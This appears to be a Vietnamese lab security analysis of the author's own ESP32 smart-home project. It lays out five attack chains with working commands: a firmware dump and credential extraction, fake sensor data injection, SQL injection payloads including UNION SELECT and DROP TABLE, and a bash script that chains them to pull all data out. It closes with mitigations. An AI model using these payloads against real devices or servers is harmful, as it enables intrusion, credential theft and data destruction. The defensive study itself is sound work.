# ⚔️ ATTACK CHAINS - IoT SMART HOME

## Chuỗi Tấn Công ESP32 Smart Home (Entry → Impact)

---

## 📊 Tổng Quan Attack Chains

| ID | Tên Attack Chain | Entry Point | Mục Tiêu Cuối | Độ Phức Tạp |
|----|------------------|-------------|---------------|-------------|
| AC1 | Credential Extraction Chain | Physical Access | Network Compromise | 🟡 Trung bình |
| AC2 | Data Injection Chain | Network Access | Data Manipulation | 🟢 Thấp |
| AC3 | Physical Sensor Spoofing | Physical Access | Automation Hijack | 🟢 Thấp |
| AC4 | API Exploitation Chain | Network Access | Database Compromise | 🟡 Trung bình |
| AC5 | Full System Compromise | Physical Access | Complete Takeover | 🔴 Cao |

---

## ⛓️ ATTACK CHAIN 1: Credential Extraction Chain

### Mục tiêu: Trích xuất credentials từ firmware để truy cập mạng

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   STEP 1        │     │   STEP 2        │     │   STEP 3        │     │   STEP 4        │
│   ENTRY         │────▶│   EXPLOITATION  │────▶│   ESCALATION    │────▶│   IMPACT        │
│                 │     │                 │     │                 │     │                 │
│ Physical Access │     │ Firmware Dump   │     │ Credential      │     │ Network         │
│ to ESP32 USB    │     │ via esptool     │     │ Extraction      │     │ Compromise      │
└─────────────────┘     └─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Chi tiết từng bước:

| Bước | Hành động | Command/Tool | Output |
|------|-----------|--------------|--------|
| **1. ENTRY** | Kết nối USB vào ESP32 | USB-C cable | COM port access |
| **2. EXPLOITATION** | Dump firmware flash | `esptool.py read_flash` | firmware.bin (4MB) |
| **3. ESCALATION** | Extract strings | `strings firmware.bin \| grep` | WiFi/API credentials |
| **4. IMPACT** | Join WiFi network | WiFi connection | Full network access |

### Commands:
```bash
# Step 1: Xác định COM port
esptool.py chip_id

# Step 2: Dump toàn bộ flash
esptool.py --chip esp32s3 --port COM3 read_flash 0x0 0x800000 firmware.bin

# Step 3: Tìm credentials
strings firmware.bin | grep -i -E "(ssid|password|wifi|key|api)"

# Output example:
# WIFI_SSID=Bang
# WIFI_PASSWORD=12345678
# API_KEY=sk_live_51234567890abcdef

# Step 4: Kết nối mạng với credentials đã lấy được
netsh wlan connect name="Bang"
```

### Hậu quả:
- ✅ Truy cập mạng WiFi gia đình
- ✅ Sniff traffic của tất cả IoT devices
- ✅ Truy cập các thiết bị khác trong mạng
- ✅ Fake API requests với stolen API key

---

## ⛓️ ATTACK CHAIN 2: Data Injection Chain

### Mục tiêu: Inject dữ liệu giả vào hệ thống qua API

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   STEP 1        │     │   STEP 2        │     │   STEP 3        │     │   STEP 4        │
│   ENTRY         │────▶│   RECON         │────▶│   EXPLOITATION  │────▶│   IMPACT        │
│                 │     │                 │     │                 │     │                 │
│ Network Access  │     │ API Discovery   │     │ Data Injection  │     │ Dashboard       │
│ (Same WiFi)     │     │ & Analysis      │     │ via POST        │     │ Manipulation    │
└─────────────────┘     └─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Chi tiết từng bước:

| Bước | Hành động | Command/Tool | Output |
|------|-----------|--------------|--------|
| **1. ENTRY** | Kết nối cùng mạng WiFi | Network access | Same subnet |
| **2. RECON** | Discover API endpoints | `curl /api/devices` | Device list, API structure |
| **3. EXPLOITATION** | Inject fake sensor data | `curl -X POST /api/sensor/data` | HTTP 200 - Data accepted |
| **4. IMPACT** | False data on dashboard | Browser refresh | Fake readings displayed |

### Commands:
```bash
# Step 1: Xác định target (trên cùng mạng)
nmap -sn 192.168.137.0/24

# Step 2: Khám phá API
curl http://192.168.137.1:5000/api/devices
# Response: {"devices": ["esp32_001"]}

curl http://192.168.137.1:5000/api/sensor/latest/esp32_001
# Response: {"temperature": 25.5, "humidity": 60, ...}

# Step 3: Inject fake data
curl -X POST http://192.168.137.1:5000/api/sensor/data \
  -H "Content-Type: application/json" \
  -d '{
    "device_id": "HACKED_DEVICE",
    "temperature": 999.9,
    "humidity": 999.9,
    "light": 100,
    "timestamp": 1704672000
  }'
# Response: {"status": "success", "device_id": "HACKED_DEVICE"}

# Step 4: Verify on dashboard
curl http://192.168.137.1:5000/api/sensor/latest/HACKED_DEVICE
```

### Hậu quả:
- ✅ Dữ liệu giả xuất hiện trên dashboard
- ✅ Làm sai lệch analytics và reports
- ✅ Có thể trigger wrong automations
- ✅ Tạo confusion cho operators

---

## ⛓️ ATTACK CHAIN 3: Physical Sensor Spoofing

### Mục tiêu: Can thiệp vật lý vào sensor để inject false data

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   STEP 1        │     │   STEP 2        │     │   STEP 3        │     │   STEP 4        │
│   ENTRY         │────▶│   PREPARATION   │────▶│   EXECUTION     │────▶│   IMPACT        │
│                 │     │                 │     │                 │     │                 │
│ Physical Access │     │ Identify LDR    │     │ Manipulate      │     │ False Data      │
│ to Device       │     │ Sensor Location │     │ Light Source    │     │ in System       │
└─────────────────┘     └─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Chi tiết từng bước:

| Bước | Hành động | Tool/Method | Output |
|------|-----------|-------------|--------|
| **1. ENTRY** | Tiếp cận vật lý thiết bị | Physical presence | Device access |
| **2. PREPARATION** | Xác định vị trí LDR sensor | Visual inspection | GPIO 1 - LDR module |
| **3. EXECUTION** | Che/chiếu sáng LDR | Cover/LED flashlight | Light: 0% or 100% |
| **4. IMPACT** | False light readings | Dashboard update | Wrong automation triggers |

### Demonstration:
```
Thí nghiệm 1: Che kín LDR
──────────────────────────
Trước: Light = 50% (bình thường)
Sau:   Light = 0% (tối hoàn toàn)
→ Dashboard hiển thị "Tối" → Có thể trigger bật đèn tự động

Thí nghiệm 2: Chiếu đèn LED mạnh
────────────────────────────────
Trước: Light = 50% (bình thường)
Sau:   Light = 100% (sáng maximum)
→ Dashboard hiển thị "Sáng" → Có thể trigger tắt đèn/đóng rèm

Thí nghiệm 3: Nung nóng DHT11
─────────────────────────────
Trước: Temp = 25°C (bình thường)
Sau:   Temp = 45°C (heated)
→ Dashboard hiển thị nhiệt độ cao → Trigger AC/cooling system
```

### Hậu quả:
- ✅ Sai lệch dữ liệu sensor thực tế
- ✅ Kích hoạt automation sai lệch
- ✅ Lãng phí năng lượng (bật/tắt thiết bị không cần thiết)
- ✅ Security bypass (ví dụ: đánh lừa motion sensor)

---

## ⛓️ ATTACK CHAIN 4: API Exploitation Chain (SQL Injection)

### Mục tiêu: Khai thác SQL Injection để compromise database

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   STEP 1        │     │   STEP 2        │     │   STEP 3        │     │   STEP 4        │
│   ENTRY         │────▶│   TESTING       │────▶│   EXPLOITATION  │────▶│   IMPACT        │
│                 │     │                 │     │                 │     │                 │
│ API Access      │     │ SQLi Detection  │     │ SQL Injection   │     │ Database        │
│ Discovery       │     │ Test Payloads   │     │ Data Extraction │     │ Compromise      │
└─────────────────┘     └─────────────────┘     └─────────────────┘     └─────────────────┘
```

### Chi tiết từng bước:

| Bước | Hành động | Payload | Output |
|------|-----------|---------|--------|
| **1. ENTRY** | Tìm endpoints có user input | GET /api/sensor/latest/{id} | Parameter: device_id |
| **2. TESTING** | Test SQL injection | `' OR '1'='1` | Error or all data returned |
| **3. EXPLOITATION** | Extract data | `' UNION SELECT...--` | Sensitive data leaked |
| **4. IMPACT** | DB manipulation | `'; DROP TABLE...--` | Data destruction |

### Commands:
```bash
# Step 1: Identify injectable parameter
curl "http://192.168.137.1:5000/api/sensor/latest/esp32_001"
# → device_id is user-controlled input

# Step 2: Test for SQLi
curl "http://192.168.137.1:5000/api/sensor/latest/esp32_001'"
# → Error message reveals SQL structure

curl "http://192.168.137.1:5000/api/sensor/latest/' OR '1'='1"
# → Returns all records (SQLi confirmed!)

# Step 3: Extract database schema
curl "http://192.168.137.1:5000/api/sensor/latest/' UNION SELECT 1,sql,3,4,5,6,7 FROM sqlite_master--"
# → Reveals table structures

# Step 4: Data exfiltration
curl "http://192.168.137.1:5000/api/sensor/latest/' UNION SELECT 1,device_id,temperature,humidity,light,timestamp,received_at FROM sensor_readings--"
# → All sensor data leaked
```

### Vulnerable Code:
```python
# simple_server.py - line 90
query = f"SELECT * FROM sensor_readings WHERE device_id = '{device_id}'"
# device_id được inject trực tiếp vào query!
```

### Hậu quả:
- ✅ Truy cập toàn bộ dữ liệu sensor
- ✅ Lộ thông tin về tất cả devices
- ✅ Có thể xóa/modify dữ liệu
- ✅ Potential Remote Code Execution qua SQLite

---

## ⛓️ ATTACK CHAIN 5: Full System Compromise

### Mục tiêu: Chiếm toàn bộ hệ thống từ physical access

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   STEP 1     │    │   STEP 2     │    │   STEP 3     │    │   STEP 4     │
│   ENTRY      │───▶│   LATERAL    │───▶│   PRIVILEGE  │───▶│   IMPACT     │
│              │    │   MOVEMENT   │    │   ESCALATION │    │              │
│ Firmware     │    │ Network      │    │ Backend      │    │ Full         │
│ Extraction   │    │ Infiltration │    │ Exploitation │    │ Compromise   │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
        │                  │                  │                  │
        ▼                  ▼                  ▼                  ▼
   Credentials        WiFi Access       RCE via Debug      Data + System
   Extracted          Obtained          Mode/SQLi          Controlled
```

### Chi tiết từng bước:

| Bước | Hành động | Kết quả |
|------|-----------|---------|
| **1. ENTRY** | Dump firmware → Extract WiFi + API credentials | WiFi password, API key |
| **2. LATERAL** | Join network → Scan for backend server | Backend IP:5000 discovered |
| **3. ESCALATION** | SQLi OR trigger debug error → RCE attempt | Database access / Code execution |
| **4. IMPACT** | Full system control | All data + control capabilities |

### Full Attack Script:
```bash
#!/bin/bash
# FULL SYSTEM COMPROMISE SCRIPT
# ⚠️ FOR EDUCATIONAL PURPOSES ONLY

TARGET_ESP32="COM3"
TARGET_NETWORK="192.168.137.0/24"

echo "=== STEP 1: FIRMWARE EXTRACTION ==="
esptool.py --port $TARGET_ESP32 read_flash 0x0 0x800000 firmware.bin
WIFI_PASS=$(strings firmware.bin | grep -oP 'WIFI_PASSWORD.*"\K[^"]+')
API_KEY=$(strings firmware.bin | grep -oP 'API_KEY.*"\K[^"]+')
echo "[+] WiFi Password: $WIFI_PASS"
echo "[+] API Key: $API_KEY"

echo "=== STEP 2: NETWORK INFILTRATION ==="
# Connect to WiFi with extracted password
# Scan network for backend
BACKEND=$(nmap -sn $TARGET_NETWORK -oG - | grep "5000" | awk '{print $2}')
echo "[+] Backend found: $BACKEND"

echo "=== STEP 3: API EXPLOITATION ==="
# Test for SQLi and extract data
curl "$BACKEND:5000/api/sensor/latest/' OR '1'='1"
# Trigger debug mode error for potential RCE
curl "$BACKEND:5000/api/sensor/data" -d '{"__debug__": true}'

echo "=== STEP 4: FULL COMPROMISE ==="
# Exfiltrate all data
curl "$BACKEND:5000/api/devices" > devices.json
for device in $(jq -r '.devices[]' devices.json); do
    curl "$BACKEND:5000/api/sensor/history/$device" >> all_data.json
done
echo "[+] All data exfiltrated to all_data.json"
echo "[+] SYSTEM FULLY COMPROMISED"
```

### Hậu quả (Total Impact):
| Asset | Impact |
|-------|--------|
| **WiFi Network** | ✅ Full access to home network |
| **IoT Devices** | ✅ Control all connected devices |
| **Sensor Data** | ✅ All historical data exfiltrated |
| **Database** | ✅ Read/Write/Delete capabilities |
| **Backend Server** | ✅ Potential RCE via debug mode |
| **Privacy** | ✅ Home activity patterns exposed |

---

## 🛡️ Phòng Chống Attack Chains

### Ngắt Chain tại mỗi điểm:

| Attack Chain | Ngắt tại Step 1 | Ngắt tại Step 2 | Ngắt tại Step 3 |
|--------------|-----------------|-----------------|-----------------|
| **AC1** | Flash Encryption | Disable UART debug | NVS encrypted storage |
| **AC2** | Network segmentation | API rate limiting | Authentication required |
| **AC3** | Tamper-evident case | Sensor shielding | Anomaly detection |
| **AC4** | Firewall rules | Input validation | Parameterized queries |
| **AC5** | All above combined | Defense in depth | Monitoring & alerting |

---

## 📋 Checklist Phòng Chống

- [ ] Enable ESP32 Flash Encryption
- [ ] Enable Secure Boot
- [ ] Disable debug mode in production
- [ ] Implement HTTPS/TLS
- [ ] Add API authentication (JWT)
- [ ] Use parameterized SQL queries
- [ ] Add input validation
- [ ] Implement rate limiting
- [ ] Set up network segmentation
- [ ] Add intrusion detection/monitoring
- [ ] Physical tamper detection
- [ ] Regular security audits

---

> **Ngày tạo**: 07/01/2026  
> **Dự án**: ESP32 Smart Home IoT Security Analysis  
> **Mục đích**: Giáo dục về An toàn thông tin IoT  
> **⚠️ CẢNH BÁO**: Chỉ sử dụng trong môi trường lab có sự cho phép!
